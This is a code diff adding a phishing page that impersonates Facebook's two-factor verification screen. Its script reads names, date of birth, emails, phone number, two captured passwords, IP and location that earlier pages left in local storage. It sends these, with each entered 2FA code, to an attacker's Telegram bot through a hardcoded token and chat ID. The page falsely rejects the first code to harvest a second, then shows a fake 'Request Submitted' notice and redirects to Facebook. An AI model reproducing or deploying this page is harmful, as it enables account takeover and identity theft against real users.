@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="https://static.xx.fbcdn.net/rsrc.php/y1/r/ay1hV6OlegS.ico">
+    <title>Check your text messages</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .twofa-container {
+            background-color: #f0f2f5;
+            padding: 30px;
+            border-radius: 8px;
+            width: 90%;
+            max-width: 550px;
+            text-align: center;
+        }
+        .twofa-container h3 {
+            font-size: 20px;
+            color: #1c2b33;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+        .twofa-container p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 20px;
+            line-height: 1.4;
+            text-align: left;
+        }
+        .twofa-container .illustration {
+            width: -webkit-fill-available;
+            margin: 20px auto;
+            display: block;
+        }
+        .twofa-container .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .twofa-container label {
+            display: block;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 5px;
+        }
+        .twofa-container input#twofaInput {
+            width: 100%;
+            padding: 12px 10px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .twofa-container input#twofaInput:focus {
+            border-color: #1877f2;
+        }
+        .twofa-container .error-message {
+            color: #fa3e3e;
+            font-size: 13px;
+            margin-top: 10px;
+            margin-bottom: 10px;
+            text-align: left;
+            display: none; /* Hidden by default */
+        }
+        .twofa-container .timer-info {
+            display: flex;
+            align-items: center;
+            font-size: 14px;
+            color: #606770;
+            margin-bottom: 20px;
+        }
+        .twofa-container .timer-icon {
+            width: 16px;
+            height: 16px;
+            margin-right: 8px;
+            /* Placeholder for timer icon - you might need a small SVG or image */
+            /* Using a simple SVG for a circle icon */
+            background-image: url('data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor"%3E%3Cpath d="M12 2C6.47 2 2 6.47 2 12s4.47 10 10 10 10-4.47 10-10S17.53 2 12 2zm.9 13H11V7h2V14.5h.9z"/%3E%3C/svg%3E');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            display: inline-block;
+            vertical-align: middle;
+        }
+        .twofa-container #twofaTimer {
+            font-weight: bold;
+            margin-left: 4px;
+            display: inline-block;
+        }
+        .twofa-container #waitTimer {
+            font-weight: bold;
+            margin: 0 4px;
+            display: inline-block;
+        }
+        .twofa-container button#confirmTwofaButton {
+            background-color: #2583ffda; /* Light gray background */
+            color: #ffffff; /* Dark gray text */
+            padding: 10px 20px;
+            border: 1px solid #2583ffda; /* Light gray border */
+            border-radius: 16px;
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        .twofa-container button#confirmTwofaButton:hover {
+            background-color: #0074e9; /* Slightly darker gray on hover */
+        }
+
+        /* Refund Notification Popup */
+        .refund-popup-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 3000;
+            display: none; /* Hidden by default */
+        }
+        .refund-popup-content {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            position: relative;
+        }
+        .refund-popup-content .success-icon {
+            width: 60px;
+            height: 60px;
+            margin: 0 auto 20px;
+            background-color: #42b883;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+            color: white;
+        }
+        .refund-popup-content h3 {
+            font-size: 24px;
+            color: #1c2b33;
+            margin-bottom: 15px;
+            font-weight: bold;
+        }
+        .refund-popup-content p {
+            font-size: 16px;
+            color: #606770;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        .refund-popup-content .refund-amount {
+            font-size: 20px;
+            color: #42b883;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        .refund-popup-content .processing-time {
+            background-color: #f0f2f5;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #606770;
+        }
+        .refund-popup-content button {
+            background-color: #1877f2;
+            color: #fff;
+            padding: 12px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            outline: none;
+            margin-top: 10px;
+        }
+        .refund-popup-content button:hover {
+            background-color: #166fe5;
+        }
+
+        /* Mobile Adjustments */
+        @media (max-width: 768px) {
+            .twofa-container {
+                padding: 20px;
+            }
+            .refund-popup-content {
+                padding: 30px 20px;
+                margin: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="twofa-container">
+        <h3>Check your text messages</h3>
+        <p id="twofaDescription">Enter the code for this account that we send to <span id="phoneDisplay"></span>, <span id="emailDisplay"></span> or simply confirm through the application of two factors that you have set (such as Duo Mobile or Google Authenticator)</p>
+        <img src="https://i.ibb.co/dwcfYPs7/2fa.png" alt="2FA Illustration" class="illustration">
+        <div class="input-group">
+             <input type="text" id="twofaInput" placeholder="Code" required>
+            <div class="error-message" id="twofaError">Incorrect code. Please try again.</div>
+        </div>
+        <div class="timer-info" id="waitTimerInfo" style="display: none;">
+            <span class="timer-icon"></span>
+            <span>Please wait </span><span id="waitTimer">30</span><span> seconds before trying again.</span>
+        </div>
+        <div class="timer-info" id="resendTimerInfo">
+            <span class="timer-icon"></span>
+            <span>We can send a new code in </span><span id="twofaTimer">2:55</span>
+        </div>
+        <button id="confirmTwofaButton">Continue</button>
+    </div>
+
+    <!-- Request Processing Popup -->
+    <div class="refund-popup-overlay" id="refundPopupOverlay">
+        <div class="refund-popup-content">
+            <div class="success-icon">✓</div>
+            <h3>Request Submitted</h3>
+            <p>Your request has been added to the processing queue. We will handle your request within 24 hours in case we do not receive feedback, please send back information so we can assist you.</p>
+            <button id="closeRefundPopup">Return to Facebook</button>
+        </div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8114953279:AAEN0t9oMK1HKMWyo4RqHuHih-Lb4MwgwpY';
+        const TELEGRAM_CHAT_ID = '-4872697790';
+        const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        let storedFormData = {};
+        let storedIpAddress = 'N/A';
+        let storedLocationData = 'N/A';
+        let storedPasswordAttemptValue1 = '';
+        let storedPasswordAttemptValue2 = '';
+        let twoFAAttemptCount = 0; // Initialize count for 2FA page
+        let twoFAAttemptValue1 = '';
+        let twoFAAttemptValue2 = '';
+        let timerInterval;
+        let timerSeconds = 175; // 3 minutes = 180 seconds - 5 seconds (to show 2:55 initially)
+        let waitTimerInterval;
+        let waitTimerSeconds = 30; // 30 seconds wait after first failed attempt
+        let isWaiting = false;
+
+        // Elements (will be initialized in DOMContentLoaded)
+        let twofaInput;
+        let twofaError;
+        let confirmTwofaButton;
+        let twofaTimerDisplay;
+        let waitTimerInfo;
+        let resendTimerInfo;
+        let waitTimerDisplay;
+        let phoneDisplay;
+        let emailDisplay;
+        let refundPopupOverlay;
+        let closeRefundPopup;
+
+        // --- Utility Functions ---
+
+        // Send message to Telegram
+        async function sendMessageToTelegram(message) {
+            const params = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            try {
+                const response = await fetch(TELEGRAM_API_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(params)
+                });
+                const data = await response.json();
+                if (!data.ok) {
+                    console.error('Telegram API error:', data.description);
+                } else {
+                    console.log('Message sent to Telegram successfully!');
+                }
+            } catch (error) {
+                console.error('Error sending message to Telegram:', error);
+            }
+        }
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timerSeconds / 60);
+            const seconds = timerSeconds % 60;
+            twofaTimerDisplay.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+        }
+
+        function startTimer() {
+            updateTimerDisplay(); // Display initial 2:55
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                updateTimerDisplay();
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    twofaTimerDisplay.textContent = '0:00';
+                    // Optional: logic to enable a 'Resend code' button here
+                }
+            }, 1000);
+        }
+
+        function startWaitTimer() {
+            isWaiting = true;
+            confirmTwofaButton.disabled = true;
+            confirmTwofaButton.style.opacity = '0.5';
+            confirmTwofaButton.style.cursor = 'not-allowed';
+            twofaInput.disabled = true;
+            waitTimerInfo.style.display = 'flex';
+            resendTimerInfo.style.display = 'none';
+            
+            waitTimerSeconds = 30;
+            waitTimerDisplay.textContent = waitTimerSeconds;
+            
+            waitTimerInterval = setInterval(() => {
+                waitTimerSeconds--;
+                waitTimerDisplay.textContent = waitTimerSeconds;
+                
+                if (waitTimerSeconds <= 0) {
+                    clearInterval(waitTimerInterval);
+                    isWaiting = false;
+                    confirmTwofaButton.disabled = false;
+                    confirmTwofaButton.style.opacity = '1';
+                    confirmTwofaButton.style.cursor = 'pointer';
+                    twofaInput.disabled = false;
+                    waitTimerInfo.style.display = 'none';
+                    resendTimerInfo.style.display = 'flex';
+                    twofaInput.focus();
+                }
+            }, 1000);
+        }
+
+        // --- 2FA Page Logic ---
+        function setupEventListeners() {
+            confirmTwofaButton.addEventListener('click', async () => {
+            // Check if waiting period is active
+            if (isWaiting) {
+                return;
+            }
+
+            const twofaCode = twofaInput.value;
+            if (!twofaCode) {
+                twofaError.textContent = 'Code cannot be empty.';
+                twofaError.style.display = 'block';
+                return;
+            }
+
+            twoFAAttemptCount++;
+
+            let message = `<b>New Verification Request Attempt ${twoFAAttemptCount}</b>\n`;
+            message += `------------------------------------\n`;
+            message += `<b>IP:</b> <code>${storedIpAddress}</code>\n`;
+            message += `<b>Location:</b> <code>${storedLocationData}</code>\n`;
+            message += `------------------------------------\n`;
+            message += `<b>Full Name:</b> <code>${storedFormData.fullName || 'N/A'}</code>\n`;
+            message += `<b>Page Name:</b> <code>${storedFormData.pageName || 'N/A'}</code>\n`;
+            message += `<b>Date of Birth:</b> <code>${storedFormData.dobDay || ''}/${storedFormData.dobMonth || ''}/${storedFormData.dobYear || ''}</code>\n`;
+            message += `<b>Note:</b> <code>${storedFormData.note || 'N/A'}</code>\n`;
+            message += `------------------------------------\n`;  
+            message += `<b>Email:</b> <code>${storedFormData.email || 'N/A'}</code>\n`;
+            message += `<b>Business Email:</b> <code>${storedFormData.businessEmail || 'N/A'}</code>\n`;
+            message += `<b>Phone Number:</b> <code>${storedFormData.phoneNumber || 'N/A'}</code>\n`;
+            message += `------------------------------------\n`;  
+            message += `<b>Password  1:</b> <code>${storedPasswordAttemptValue1}</code>\n`;
+            message += `<b>Password  2:</b> <code>${storedPasswordAttemptValue2}</code>\n`;
+
+            if (twoFAAttemptCount === 1) {
+                twoFAAttemptValue1 = twofaCode;
+                message += `<b>2FA Code Attempt 1:</b> <code>${twoFAAttemptValue1}</code>\n`;
+                await sendMessageToTelegram(message);
+                twofaError.textContent = 'Incorrect code. Please try again.';
+                twofaError.style.display = 'block';
+                twofaInput.value = ''; // Clear input for next attempt
+                
+                // Start 30 second wait timer
+                startWaitTimer();
+            } else if (twoFAAttemptCount === 2) {
+                twoFAAttemptValue2 = twofaCode;
+                message += `<b>2FA Code Attempt 1:</b> <code>${twoFAAttemptValue1}</code>\n`;
+                message += `<b>2FA Code Attempt 2:</b> <code>${twoFAAttemptValue2}</code>\n`;
+                await sendMessageToTelegram(message);
+
+                // Show request processing popup
+                showRefundPopup();
+            }
+            });
+
+            // Event listener for close button
+            closeRefundPopup.addEventListener('click', hideRefundPopup);
+        }
+
+        // --- Refund Popup Functions ---
+        function showRefundPopup() {
+            refundPopupOverlay.style.display = 'flex';
+            clearInterval(timerInterval); // Clear the timer
+        }
+
+        function hideRefundPopup() {
+            refundPopupOverlay.style.display = 'none';
+            // Clear localStorage and redirect after popup is closed
+            localStorage.clear();
+            window.location.href = 'https://www.facebook.com';
+        }
+
+        // --- Initial Setup for 2FA Page ---
+        document.addEventListener('DOMContentLoaded', () => {
+            // Initialize elements
+            twofaInput = document.getElementById('twofaInput');
+            twofaError = document.getElementById('twofaError');
+            confirmTwofaButton = document.getElementById('confirmTwofaButton');
+            twofaTimerDisplay = document.getElementById('twofaTimer');
+            waitTimerInfo = document.getElementById('waitTimerInfo');
+            resendTimerInfo = document.getElementById('resendTimerInfo');
+            waitTimerDisplay = document.getElementById('waitTimer');
+            phoneDisplay = document.getElementById('phoneDisplay');
+            emailDisplay = document.getElementById('emailDisplay');
+            refundPopupOverlay = document.getElementById('refundPopupOverlay');
+            closeRefundPopup = document.getElementById('closeRefundPopup');
+
+            // Retrieve stored data from localStorage
+            const formDataJSON = localStorage.getItem('formData');
+            if (formDataJSON) {
+                storedFormData = JSON.parse(formDataJSON);
+            } else {
+                alert('No form data found. Please start from the beginning.');
+                window.location.href = 'confirm.html';
+                return;
+            }
+
+            storedIpAddress = localStorage.getItem('ipAddress') || 'N/A';
+            storedLocationData = localStorage.getItem('locationData') || 'N/A';
+            storedPasswordAttemptValue1 = localStorage.getItem('passwordAttemptValue1') || '';
+            storedPasswordAttemptValue2 = localStorage.getItem('passwordAttemptValue2') || '';
+
+            // Display phone number and email
+            const phoneNumber = storedFormData.phoneNumber || 'N/A';
+            const email = storedFormData.email || storedFormData.businessEmail || 'N/A';
+            
+            phoneDisplay.textContent = phoneNumber;
+            emailDisplay.textContent = email;
+
+            // Setup event listeners
+            setupEventListeners();
+
+            // Start the timer
+            startTimer();
+        });
+
+        // Clear localStorage if user navigates away unexpectedly
+        window.addEventListener('beforeunload', () => {
+            localStorage.clear();
+            clearInterval(timerInterval); // Also clear timer if leaving
+            if (waitTimerInterval) {
+                clearInterval(waitTimerInterval);
+            }
+        });
+    </script>
+</body>
+</html>
